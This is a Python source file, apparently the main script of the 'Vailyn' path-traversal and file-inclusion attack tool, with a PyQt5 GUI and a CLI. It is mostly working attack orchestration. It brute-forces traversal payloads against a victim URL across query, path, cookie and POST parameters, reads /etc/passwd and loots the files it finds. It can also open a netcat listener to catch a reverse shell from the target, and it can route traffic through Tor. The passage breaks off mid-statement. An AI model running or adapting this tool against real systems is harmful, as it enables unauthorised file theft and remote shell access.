#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import treelib, argparse
import requests, sys
import random, string
import subprocess
import colorama
import datetime
import time
import os

import core.variables as variables

from itertools import permutations
from multiprocessing.pool import ThreadPool as Pool
from PyQt5.QtCore import Qt
from PyQt5 import QtWidgets, uic, QtCore, QtGui
from PyQt5.QtWidgets import QTreeWidgetItem, QTableWidgetItem, QFileDialog

from core.methods.parser import build_parser
from core.methods.print import banner, listprint2
from core.methods.list import listsplit
from core.methods.select import select
from core.methods.tree import create_tree
from core.methods.attack import phase1, phase2, lfishell
from core.methods.cookie import readCookie, getCookie
from core.methods.cache import load, save, parseUrl
from core.methods.tor import initcheck, enableTor

from core.colors import color
from core.variables import payloadlist, nullchars, version, sdirs, commons, processes, cachedir


#initialize colorama
colorama.init()

#initialize file tree
filetree = treelib.Tree()
filetree.create_node(color.O+"/"+color.END+color.RD, "root")

"""Vailyn's Graphical User Interface"""
class VailynApp(QtWidgets.QDialog):
    #initialise arguments
    victim = ""
    attack = 0
    filedict = ""
    dirdict = ""
    depth1 = 8
    depth2 = 2
    param = ""
    post = ""
    authcookie = ""
    tor = False
    loot = False
    vlnfile = "/etc/passwd"
    victim2 = ""

    #initialise results
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []

    cookie = ""
    selected = ""

    unix = False

    def __init__(self):
        super(VailynApp, self).__init__()
        uic.loadUi("core/qt5/Main.ui", self) # Load the .ui file
        self.attackOption.addItem("query")
        self.attackOption.addItem("path")
        self.attackOption.addItem("cookie")
        self.attackOption.addItem("post")
        self.attackOption.addItem("scraper")
        self.newTargetButton.clicked.connect(self.getVictim)
        self.attackButton.clicked.connect(self.attackGui)
        self.infoButton.clicked.connect(self.showAttackInfo)
        self.fileDictButton.clicked.connect(self.getFileDictionary)
        self.dirDictButton.clicked.connect(self.getDirDictionary)
        self.addCookieButton.clicked.connect(self.getAuthCookie)
        self.shellBox.stateChanged.connect(self.handleShell)
        self.attackOption.currentIndexChanged.connect(self.updateAttack)
        self.attack = self.attackOption.currentIndex() + 1
        self.treeView.setHeaderHidden(True)
        self.show()

    def updateAttack(self):
        self.attack = self.attackOption.currentIndex() + 1

    def getFileName(self):
        return QFileDialog.getOpenFileName()

    def getAuthCookie(self):
        self.cookieDisplay.setText(self.getFileName()[0])

    def getFileDictionary(self):
        self.fileDictDisplay.setText(self.getFileName()[0])

    def getDirDictionary(self):
        self.dirDictDisplay.setText(self.getFileName()[0])

    def showAttackInfo(self):
        if self.attack == 1:
            self.showInfo("[GET] http://example.com?file=../../../")
        elif self.attack == 2:
            self.showInfo("[GET] http://example.com/../../../")
        elif self.attack == 3:
            self.showInfo("[GET] http://example.com COOKIE=../../../")
        elif self.attack == 4:
            self.showInfo("[POST] http://example.com POST=../../../")
        elif self.attack == 5:
            self.showInfo("Automatically retreive all links & perform tests")

    def showInfo(self, message):
        self.infoDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Info.ui", self.infoDialog)
        self.infoDialog.infoMessage.setText(message)
        self.infoDialog.okButton.clicked.connect(self.infoDialog.close)
        self.infoDialog.exec_()

    def guiSelect(self, payloadlist, nullbytes=False):
        def intern():
            self.selectedp = self.payloadDialog.payloadSelectInput.text()
            if self.selectedp.strip().lower() == "a":
                self.selection = payloadlist
            elif nullbytes and self.selectedp.strip().lower() == "n":
                self.selection = []
            else:
                try:
                    self.selection = [payloadlist[int(i.strip())] for i in self.selectedp.split(",")]
                    self.payloadDialog.close()
                except:
                    self.showError("Invalid Selection string.")

        self.pacancel = False

        def cancel():
            self.pacancel = True
            self.payloadDialog.close()

        #filter duplicates
        payloadlist = list(set(payloadlist))
        pstr = ""
        pstr = pstr + listprint2(payloadlist, nullbytes)


        self.selectedp = ""
        self.payloadDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Payload.ui", self.payloadDialog)
        self.payloadDialog.payloadBrowser.setText(pstr)
        if nullbytes:
            self.payloadDialog.selectLabel.setText("Select Nullbytes")
        else:
            self.payloadDialog.selectLabel.setText("Select Payloads")
        self.payloadDialog.selectPayloadButton.clicked.connect(intern)
        self.payloadDialog.cancelButton.clicked.connect(cancel)
        self.selection = []
        self.payloadDialog.exec_()

        if self.pacancel:
            return None
        return self.selection

    def readCookieGui(self, target):
        def intern():
            self.selected = self.cookieDialog.cookieSelectInput.text().strip()
            if self.selected == "" or self.selected not in self.cstr:
                self.showError("Invalid Cookie Name.")
            else:
                self.cookieDialog.close()

        cookie = getCookie(target)
        self.cocancel = False
        i = 0
        if len(cookie.keys()) < 1:
            self.showError("Server did not send any cookies.")
            return (None, None)
        self.cstr = ""
        for key in cookie.keys():
            self.cstr = self.cstr + str(i) + ": " + key + "\n"
            i += 1

        def cancel():
            self.cookieDialog.close()
            self.cocancel = True

        self.selected = ""
        self.cookieDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Cookie.ui", self.cookieDialog)
        self.cookieDialog.cookieBrowser.setText(self.cstr)
        self.cookieDialog.selectCookieButton.clicked.connect(intern)
        self.cookieDialog.cancelButton.clicked.connect(cancel)
        self.cookieDialog.exec_()
        if self.cocancel:
            return (None, None)
        return (cookie, self.selected)

    def handleShell(self):
        if self.shellBox.isChecked():
            variables.revshell = True
            self.shellLabel.setEnabled(True)
            self.portEdit.setEnabled(True)
            self.ipEdit.setEnabled(True)
        else:
            variables.revshell = False
            self.shellLabel.setEnabled(False)
            self.portEdit.setEnabled(False)
            self.ipEdit.setEnabled(False)

    def attackGui(self):
        sdirs = ['']
        commons = []
        self.foundfiles = [""]
        self.foundurls = [""]
        self.foundpayloads = []
        self.foundnullbytes = []
        self.attack = self.attackOption.currentIndex() + 1
        self.filedict = self.fileDictDisplay.text().strip()
        self.dirdict = self.dirDictDisplay.text().strip()

        if self.victim == "" or (self.attack == 1 and self.param == "") or self.filedict == "" or self.dirdict == "":
            self.showError("Mandatory argument(s) not specified.")
            return

        try:
            self.depth1 = int(self.phase1Depth.text().strip())
        except ValueError:
            if self.phase1Depth.text().strip() != "":
                self.showError("Depths must be valid positive integers!")
                return
        try:
            self.depth2 = int(self.phase2Depth.text().strip())
        except ValueError:
            if self.phase2Depth.text().strip() != "":
                self.showError("Depths must be valid positive integers!")
                return
        if self.attack == 4:
            self.post = self.postInput.text()

        if variables.revshell:
            try:
                variables.LISTENIP = self.ipEdit.text().strip()
                variables.LISTENPORT = self.portEdit.text().strip()
                assert variables.LISTENPORT != "" and variables.LISTENIP != ""
            except AssertionError:
                self.showError("Listening IP and Port needed for attack.")
                return

        timeout = self.timeoutEdit.text().strip()
        if timeout != "":
            try:
                variables.timeout = int(timeout)
                assert(variables.timeout > 0)
            except (ValueError, AssertionError):
                self.showError("Timeout must be a valid positive integer!")
                return

        self.authcookie = self.cookieDisplay.text().strip()
        self.loot = self.lootBox.isChecked()
        self.tor = self.torBox.isChecked()
        self.vlnfile = self.vlnFileInput.text().strip()

        if self.tor:
            sig = enableTor(shell=False)
            if sig == 420:
                ans = self.showQuestion("Do you have the Tor service up and running?")
                if not ans:
                    return
                enableTor(shell=False, sigWin=True)
            elif sig == 1337:
                ans = self.showQuestion("Do you want to start the Tor service?")
                if not ans:
                    return
                self.unix = True
                enableTor(shell=False, sigLin=True)

        with open(self.filedict) as filelisted:
            for l in filelisted:
                commons.append(l.strip())
        with open(self.dirdict) as dirlisted:
            for l in dirlisted:
                if not l.strip().endswith("/"):
                    l = l + "/"
                sdirs.append(l.strip())

        #create directory permutations from dictionary
        iter=1
        ndirs=list.copy(sdirs)
        #remove empty string causing duplicates
        del ndirs[0]
        mdirs=[]
        while (iter<=(self.depth2)):
            mdirs += permutations(ndirs,(iter+1))
            iter+=1
        for elem in mdirs:
            diri=''.join(elem)
            sdirs.append(diri)

        #equally split dictionary entries and payloads to all threads
        splitted = listsplit(sdirs, round(len(sdirs)/processes))
        paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))

        if self.attack == 1 and self.param == "":
            self.showError("An attack parameter is required for this attack.")
            return
        elif self.attack == 4 and self.post == "":
            self.showError("A post data string is required for this attack.")
            return

        if self.attack == 4 and "INJECT" not in self.post:
            self.showError("POST Data needs to contain INJECT at injection point")
            return
        if self.attack == 4 and "=" not in self.post:
            self.showError("POST Data needs to be of form P1=V1&P2=V2")
            return
        
        if self.attack == 5:
            variables.viclist.append(self.victim)
            assert len(variables.viclist) > 0
            from core.methods.crawler import UrlSpider, arjunEnum, analyzeParam, analyzePath, analyzeCookie, analyzePost
            from scrapy.crawler import CrawlerProcess
            print("\n{0}Phase 0|{1} {2}URL Enumeration{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: URL Enumeration")
            self.show()
            starting_time = time.time()
            process = CrawlerProcess({'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'})
            process.crawl(UrlSpider)
            process.start()
            print("\n{0}Phase 1|{1} {2}Parameter Enumeration{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: Parameter Enumeration")
            self.show()
            siteparams = arjunEnum()
            print("\n{0}Phase 2|{1} {2}Query Attack{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: Query Attack")
            self.show()
            queryattack = analyzeParam(siteparams, self.victim2, variables.verbose, self.depth1, self.vlnfile, self.authcookie)
            print("\n{0}Phase 3|{1} {2}Path Attack{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: Path Attack")
            self.show()
            pathattack = analyzePath(self.victim2, variables.verbose, self.depth1, self.vlnfile, self.authcookie)
            time.sleep(1)
            print("\n{0}Phase 4|{1} {2}Cookie Attack{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: Cookie Attack")
            self.show()
            cookieattack = analyzeCookie(self.victim2, variables.verbose, self.depth1, self.vlnfile, self.authcookie)
            time.sleep(1)
            print("\n{0}Phase 5|{1} {2}POST Enumeration{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: POST Enumeration")
            self.show()
            siteparams = arjunEnum(post=True)
            print("\n{0}Phase 6|{1} {2}POST Attack{1}\n".format(color.RD, color.END, color.O))
            self.timeLabel.setText("Active Phase: POST Attack")
            self.show()
            postattack = analyzeParam(siteparams, self.victim2, variables.verbose, self.depth1, self.vlnfile, self.authcookie)
            ending_time = time.time()
            total_time = starting_time - ending_time
            atime = datetime.timedelta(seconds=total_time)
            self.timeLabel.setText("Done after " + str(atime) + ".")
            print("\n\n{}FINAL RESULTS{}\n".format(color.BOLD+color.UNDERLINE, color.END))
            print("Query Attack\n")
            for victim, sub in queryattack.items():
                print(victim)
                for param, pair in sub.items():
                    paystring = ""
                    nullstring = ""
                    for payload in pair[0]:
                        paystring = paystring + "            " + str(payload) + "\n"
                    for nullbyte in pair[1]:
                        nullstring = nullstring + "            " + str(nullbyte) + "\n"
                    print("    " + param + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
            print("Path Attack\n")
            for victim, pair in pathattack.items():
                print(victim)
                paystring = ""
                nullstring = ""
                for payload in pair[0]:
                    paystring = paystring + "        " + str(payload) + "\n"
                for nullbyte in pair[1]:
                    nullstring = nullstring + "        " + str(nullbyte) + "\n"
                print("    Payloads:\n" + paystring + "    Nullbytes:\n" + nullstring)
            print("Cookie Attack\n")
            for victim, sub in cookieattack.items():
                print(victim)
                for cname, pair in sub.items():
                    paystring = ""
                    nullstring = ""
                    for payload in pair[0]:
                        paystring = paystring + "            " + str(payload) + "\n"
                    for nullbyte in pair[1]:
                        nullstring = nullstring + "            " + str(nullbyte) + "\n"
                    print("    " + cname + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
            print("POST Attack\n")
            for victim, sub in postattack.items():
                print(victim)
                for param, pair in sub.items():
                    paystring = ""
                    nullstring = ""
                    for payload in pair[0]:
                        paystring = paystring + "            " + str(payload) + "\n"
                    for nullbyte in pair[1]:
                        nullstring = nullstring + "            " + str(nullbyte) + "\n"
                    print("    " + param + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
                
            return

        if self.attack == 3:
            self.cookie, self.selected = self.readCookieGui(self.victim)
            if self.cookie == None or self.selected == None:
                return

        vlnysis = True

        #present option to skip phase 1 if cache from previous attack present
        targetcache = parseUrl(self.victim)
        if os.path.exists(cachedir+targetcache+"payloads.cache") and os.path.exists(cachedir+targetcache+"nullbytes.cache"):
            choice = self.showQuestion("Detected payload cache. Do you want to load the cache and skip Phase 1?")
            if choice:
                vlnysis = False
                self.foundpayloads, self.foundnullbytes = load(targetcache)

        if vlnysis:
            starting_time = time.time()
            #initiate phase 1 - vulnerability analysis
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(phase1, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,variables.verbose,self.depth1,l,self.vlnfile,self.authcookie,self.post,)) for l in paysplit]
                for i in res:
                    #fetch results
                    tuples = i.get()
                    self.foundpayloads += tuples[0]
                    self.foundnullbytes += tuples[1]
                
            ending_time = time.time()
            vuln_time = ending_time - starting_time
            #save working payloads to cache
            save(targetcache, self.foundpayloads, self.foundnullbytes)
        else:
            vuln_time = 0.0

        #determine if phase 2 happens          
        attackphase = False
        if self.foundpayloads:
            attackphase = True
            self.selectedpayloads = self.guiSelect(self.foundpayloads)
            if self.foundnullbytes:
                self.selectednullbytes = self.guiSelect(self.foundnullbytes, nullbytes=True)
            else:
                self.selectednullbytes = []
        else:
            cont = self.showQuestion("No payload succeeded. Attack anyways?")
            if cont:
                attackphase = True
                #attack with everything if phase 1 was unsuccessful
                self.selectedpayloads = payloadlist
                self.selectednullbytes = nullchars

        #if self.selectedpayloads == None or self.selectednullbytes == None:
        #    return

        starting_time = time.time()
        if attackphase:
            if variables.revshell:
                if sys.platform.lower().startswith("win"):
                    sys.exit("not implemented")
                else:
                    #subprocess.Popen(["konsole", "-e", "nc", "-lvp", variables.LISTENPORT], close_fds=True)
                    subprocess.Popen(["konsole", "--hold", "-e", "nc -lvp {}".format(variables.LISTENPORT)], close_fds=True)
                    lfishell(self.attack, self.victim, self.victim2, self.param, self.cookie, self.selected, variables.verbose, self.selectedpayloads, self.selectednullbytes, self.authcookie, self.post)
            else:
                with Pool(processes=processes) as pool:
                    res = [pool.apply_async(phase2, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,commons,l,self.depth2,variables.verbose,self.loot,self.selectedpayloads,self.selectednullbytes,self.authcookie,self.post,)) for l in splitted]
                    for i in res:
                        #fetch results
                        restuple = i.get()
                        self.foundfiles += restuple[0]
                        self.foundurls += restuple[1]

                        
        ending_time = time.time()
        attack_time = ending_time - starting_time
        total_time = vuln_time + attack_time

        readable_time = datetime.timedelta(seconds=total_time)

        if self.foundfiles:
            self.guiTree(readable_time)

        self.showInfo("Attack done. Found {} files in {}.".format(len(self.foundfiles)-1, readable_time))

        if self.tor and self.unix:
            stop = self.showQuestion("Do you want to terminate the Tor service?")
            if stop:
                try:
                    subprocess.run(["systemctl", "stop", "tor"])
                except OSError:
                    subprocess.run(["service", "tor", "stop"])
                except OSError:
                    subprocess.run(["brew", "services", "stop", "tor"])
                except Exception as e:
                    sys.exit(e)


    def getVictim(self):
        def intern():
            vic = self.targetDialog.vicField.text().strip()
            pam = self.targetDialog.paramField.text().strip()
            vic2 = self.targetDialog.vic2Field.text().strip()
            post = self.targetDialog.postInput.text().strip()
            if vic == "":
                self.showError("-v VIC must be specified.")
            elif self.attack == 1 and pam == "":
                self.showError("-p PAM must be specified for query attack.")
            elif self.attack == 4 and post == "":
                self.showError("-s DAT must be specified for POST attack.")
            elif "://" not in vic:
                self.showError("scheme:// must be sepecified in -v VIC.")
            else:
                self.victim = vic
                if self.attack == 1:
                    self.param = pam
                self.victim2 = vic2
                if self.attack == 4:
                    self.post = post
                self.targetDialog.close()
                if self.attack == 1:
                    if "?" not in vic:
                        self.victimDisplayLabel.setText(vic + "?" + pam + "=INJECT" + vic2)
                    else:
                        self.victimDisplayLabel.setText(vic + "&" + pam + "=INJECT" + vic2)
                elif self.attack == 3 or self.attack == 4 or self.attack == 5:
                    self.victimDisplayLabel.setText(vic + vic2)
                elif self.attack == 2:
                    if vic.endswith("/"):
                        self.victimDisplayLabel.setText(vic + "INJECT" + vic2)
                    else:
                        self.victimDisplayLabel.setText(vic + "/" +  "INJECT" + vic2)
                self.show()

        self.targetDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Target.ui", self.targetDialog)
        if self.victim == "" and self.param == "" and self.victim2 == "":
            self.targetDialog.titleLabel.setText("Add New Target")
        else:
            self.targetDialog.titleLabel.setText("Edit Target")
        if self.attack == 1:
            self.targetDialog.paramLabel.setEnabled(True)
            self.targetDialog.paramField.setEnabled(True)
        else:
            self.targetDialog.paramLabel.setEnabled(False)
            self.targetDialog.paramField.setEnabled(False)
        if self.attack == 4:
            self.targetDialog.postLabel.setEnabled(True)
            self.targetDialog.postInput.setEnabled(True)
        else:
            self.targetDialog.postLabel.setEnabled(False)
            self.targetDialog.postInput.setEnabled(False)
        self.targetDialog.vicField.setText(self.victim)
        self.targetDialog.paramField.setText(self.param)
        self.targetDialog.vic2Field.setText(self.victim2)
        self.targetDialog.cancelButton.clicked.connect(self.targetDialog.close)
        self.targetDialog.setTargetButton.clicked.connect(intern)
        self.targetDialog.exec_()


    def guiTree(self, atime):
        self.timeLabel.setText("Done after " + str(atime) + ".")
        self.treeView.clear()
        root = QTreeWidgetItem(self.treeView)
        root.setText(0, "/")

        def create_tree(filepaths, root):
            for i in filepaths:
                contained = False
                #prevent dups if parent folder found
                for j in filepaths:
                    if i != j and i != "" and i in j:
                        contained = True
                        #print("i:"+i+"\nj:"+j)
                if i != "" and not contained:
                    tree_append(i, root)
                    
        def tree_append(path, parentnode):
            plist = path.split("/")
            id = plist[0]
            check = True
            for i in range(0, parentnode.childCount()):
                if parentnode.child(i).text(0) == id:
                    check = False
                    if len(plist) > 1:
                        tree_append("/".join(plist[1::]), parentnode.child(i))
            if check:
                child = QTreeWidgetItem(parentnode)
                child.setText(0, plist[0])
                if len(plist) > 1:
                    tree_append("/".join(plist[1::]), child)

        create_tree(self.foundfiles, root)
        self.treeView.expandAll()
        self.show()

    def showError(self, message):
        self.errorDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Error.ui", self.errorDialog)
        self.errorDialog.errorMessage.setText(message)
        self.errorDialog.errorOkButton.clicked.connect(self.errorDialog.close)
        self.errorDialog.exec_()

    def showQuestion(self, message):
        def intern():
            self.answer = True
            self.questionDialog.close()

        self.answer = False
        self.questionDialog = QtWidgets.QDialog()
        uic.loadUi("core/qt5/Question.ui", self.questionDialog)
        self.questionDialog.question.setText(message)
        self.questionDialog.noButton.clicked.connect(self.questionDialog.close)
        self.questionDialog.yesButton.clicked.connect(intern)
        self.questionDialog.exec_()
        return self.answer


"""Vailyn's main - parse args, start attacks & print results"""
def main(parser, opt, args, shell=True) -> int:    
    
    if not (opt["lists"] and opt["victim"] and opt["attack"]):
        parser.print_usage()
        sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -v, -a and -l mandatory')

    #load dictionaries
    if opt['lists']:
        with open(args.lists[0]) as filelisted:
            for l in filelisted:
                commons.append(l.strip())
        with open(args.lists[1]) as dirlisted:
            for l in dirlisted:
                if not l.strip().endswith("/"):
                    l = l + "/"
                sdirs.append(l.strip())
  
    loot = False
    victim2 = ""
    depth = 2
    verbose = variables.verbose
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []
    vlnfile = "/etc/passwd"
    checkdepth = 8
    cookiefile = ""

    #handle optional arguments
    if opt["loot"]:
        loot = True

    if opt["vic2"]:
        victim2 = args.vic2

    if opt["depths"]:
        checkdepth = args.depths[0]
        depth = args.depths[1]

    if opt["check"]:
        vlnfile = args.check

    if opt["cookie"]:
        cookiefile = args.cookie
    
    param = ""
    cookie = None
    postdata = ""
    selected = ""

    if opt["tor"]:        
        enableTor()


    #create directory permutations from dictionary
    iter=1
    ndirs=list.copy(sdirs)
    #remove empty string causing duplicates
    del ndirs[0]
    mdirs=[]
    while (iter<=(depth)):
        mdirs += permutations(ndirs,(iter+1))
        iter+=1
    for elem in mdirs:
        diri=''.join(elem)
        sdirs.append(diri)

    #equally split dictionary entries and payloads to all threads
    splitted = listsplit(sdirs, round(len(sdirs)/processes))
    paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))

    if (args.attack == 1):  #query mode
        if not opt["param"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -p mandatory for -a 1')
        print("{}Vailyn: {}PARAM{}".format(color.RC, color.END+color.RB, color.END))
        param = args.param
    elif (args.attack == 2):  #path mode
        if not args.victim.endswith("/"):
            args.victim = args.victim + "/"
        print("{}Vailyn: {}PATH{}".format(color.RC, color.END+color.RB, color.END))
    elif (args.attack == 3):  #cookie mode
        print("{}Vailyn: {}COOKIE{}".format(color.RC, color.END+color.RB, color.END))
    elif (args.attack == 4): #post traversal
        if not opt["post"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -s mandatory for -a 4')
        print("{}Vailyn: {}POST{}".format(color.RC, color.END+color.RB, color.END))
        postdata = args.post
        if "INJECT" not in postdata:
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -s needs to contain INJECT at injection point')
        if "=" not in postdata:
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -s needs to be of form P1=V1&P2=V2')
    elif args.attack == 5:
        print("{}Vailyn: {}CRAWLER{}".format(color.RC, color.END+color.RB, color.END))
    else:
        sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -a needs to be in 1..5')


    print("    v" + version)
    time.sleep(0.5)

    if variables.tor:
        print("\n{0} [TOR]{1}{6} IP{1}{0}|{1}{5} {2} {1}{4}>{1} {3}".format(color.RD, color.END, variables.initip, variables.torip, color.BOLD, color.CURSIVE, color.O))

    if args.attack == 5:
        variables.viclist.append(args.victim)
        assert len(variables.viclist) > 0
        from core.methods.crawler import UrlSpider, arjunEnum, analyzeParam, analyzePath, analyzeCookie, analyzePost
        from scrapy.crawler import CrawlerProcess
        print("\n{0}Phase 0|{1} {2}URL Enumeration{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        process = CrawlerProcess({'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'})
        process.crawl(UrlSpider)
        process.start()
        time.sleep(1)
        print("\n{0}Phase 1|{1} {2}Parameter Enumeration{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        siteparams = arjunEnum()
        time.sleep(1)
        print("\n{0}Phase 2|{1} {2}Query Attack{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        queryattack = analyzeParam(siteparams, victim2, verbose, checkdepth, vlnfile, cookiefile)
        time.sleep(1)
        print("\n{0}Phase 3|{1} {2}Path Attack{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        pathattack = analyzePath(victim2, verbose, checkdepth, vlnfile, cookiefile)
        time.sleep(1)
        print("\n{0}Phase 4|{1} {2}Cookie Attack{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        cookieattack = analyzeCookie(victim2, verbose, checkdepth, vlnfile, cookiefile)
        time.sleep(1)
        print("\n{0}Phase 5|{1} {2}POST Enumeration{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        siteparams = arjunEnum(post=True)
        time.sleep(1)
        print("\n{0}Phase 6|{1} {2}POST Attack{1}\n".format(color.RD, color.END, color.O))
        time.sleep(0.5)
        postattack = analyzePost(siteparams, victim2, verbose, checkdepth, vlnfile, cookiefile)
        time.sleep(2.5)
        print("\n\n{}FINAL RESULTS{}\n".format(color.BOLD+color.UNDERLINE, color.END))
        print("Query Attack\n")
        for victim, sub in queryattack.items():
            print(victim)
            for param, pair in sub.items():
                paystring = ""
                nullstring = ""
                for payload in pair[0]:
                    paystring = paystring + "            " + str(payload) + "\n"
                for nullbyte in pair[1]:
                    nullstring = nullstring + "            " + str(nullbyte) + "\n"
                print("    " + param + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
        print("Path Attack\n")
        for victim, pair in pathattack.items():
            print(victim)
            paystring = ""
            nullstring = ""
            for payload in pair[0]:
                paystring = paystring + "        " + str(payload) + "\n"
            for nullbyte in pair[1]:
                nullstring = nullstring + "        " + str(nullbyte) + "\n"
            print("    Payloads:\n" + paystring + "    Nullbytes:\n" + nullstring)
        print("Cookie Attack\n")
        for victim, sub in cookieattack.items():
            print(victim)
            for cname, pair in sub.items():
                paystring = ""
                nullstring = ""
                for payload in pair[0]:
                    paystring = paystring + "            " + str(payload) + "\n"
                for nullbyte in pair[1]:
                    nullstring = nullstring + "            " + str(nullbyte) + "\n"
                print("    " + cname + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
        print("POST Attack\n")
        for victim, sub in postattack.items():
            print(victim)
            for param, pair in sub.items():
                paystring = ""
                nullstring = ""
                for payload in pair[0]:
                    paystring = paystring + "            " + str(payload) + "\n"
                for nullbyte in pair[1]:
                    nullstring = nullstring + "            " + str(nullbyte) + "\n"
                print("    " + param + ":\n" + "        Payloads:\n" + paystring + "        Nullbytes:\n" + nullstring)
            
        return

    #fetch and select cookie for cookie mode
    if args.attack == 3:
        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Parsing Cookie\n'.format(color.RD, color.END))
        cookie, selected = readCookie(args.victim)

    print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Analysis Phase\n'.format(color.RD, color.END))
        
    vlnysis = True

    #present option to skip phase 1 if cache from previous attack present
    targetcache = parseUrl(args.victim)
    if os.path.exists(cachedir+targetcache+"payloads.cache") and os.path.exists(cachedir+targetcache+"nullbytes.cache"):
        choice = input("{0}[!]{1} Detected Payload cache from previous attack.\n{0}[?]{1} Do you want to load the cache and skip Phase 1? (enter if not) :> ".format(color.RD, color.END))
        if choice != "":
            vlnysis = False
            foundpayloads, foundnullbytes = load(targetcache)
        else:
            print()

    if vlnysis:
        print("{0}[+]{1} Loaded {2}{3}{1} payloads.\n".format(color.RD, color.END, color.BOLD, len(payloadlist)*len(nullchars)))
        starting_time = time.time()
        #initiate phase 1 - vulnerability analysis
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase1, args=(args.attack,args.victim,victim2,param,cookie,selected,verbose,checkdepth,l,vlnfile,cookiefile,postdata,)) for l in paysplit]
            for i in res:
                #fetch results
                tuples = i.get()
                foundpayloads += tuples[0]
                foundnullbytes += tuples[1]
            
        ending_time = time.time()
        vuln_time = ending_time - starting_time
        #save working payloads to cache
        save(targetcache, foundpayloads, foundnullbytes)
    else:
        vuln_time = 0.0

    #determine if phase 2 happens          
    attack = False
    if foundpayloads:
        attack = True
        selectedpayloads = select(foundpayloads)
        if foundnullbytes:
            selectednullbytes = select(foundnullbytes, nullbytes=True)
        else:
            selectednullbytes = []
    else:
        cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
        if cont != "":
            attack = True
            #attack with everything if phase 1 was unsuccessful
            selectedpayloads = payloadlist
            selectednullbytes = nullchars

    #start the exploitation phase
    starting_time = time.time()
    if attack:
        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Sploit Phase\n'.format(color.RD, color.END))
        if variables.revshell:
            if sys.platform.lower().startswith("win"):
                sys.exit("not implemented")
            else:
                #subprocess.Popen(["konsole", "-e", "nc", "-lvp", variables.LISTENPORT], close_fds=True)
                subprocess.Popen(["konsole", "--hold","-e", "nc -lvp {}".format(variables.LISTENPORT)], close_fds=True)
                lfishell(args.attack, args.victim, victim2, param, cookie, selected, verbose, selectedpayloads, selectednullbytes, cookiefile, postdata)
        else:
            with Pool(processes=processes) as pool:
                res = [pool.apply_async(phase2, args=(args.attack,args.victim,victim2,param,cookie,selected,commons,l,depth,verbose,loot,selectedpayloads,selectednullbytes,cookiefile,postdata,)) for l in splitted]
                for i in res:
                    #fetch results
                    restuple = i.get()
                    foundfiles += restuple[0]
                    foundurls += restuple[1]

                    
    ending_time = time.time()
    attack_time = ending_time - starting_time
    total_time = vuln_time + attack_time

    readable_time = datetime.timedelta(seconds=total_time)

    #display found files in a file tree
    print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Directory Tree\n'.format(color.RD, color.END))
    if foundfiles:
        create_tree(filetree, foundfiles)
        filetree.show()
    if not foundurls:
        print("nothing found")

    print("{}Scan completed in {}.{}".format(color.RC, readable_time, color.END))
    if variables.tor and not sys.platform.lower().startswith("win"):
        stop = input(color.END+" [?] Do you want to terminate the Tor service? (enter if not) :> ")
        if stop != "":
            try:
                subprocess.run(["systemctl", "stop", "tor"])
            except OSError:
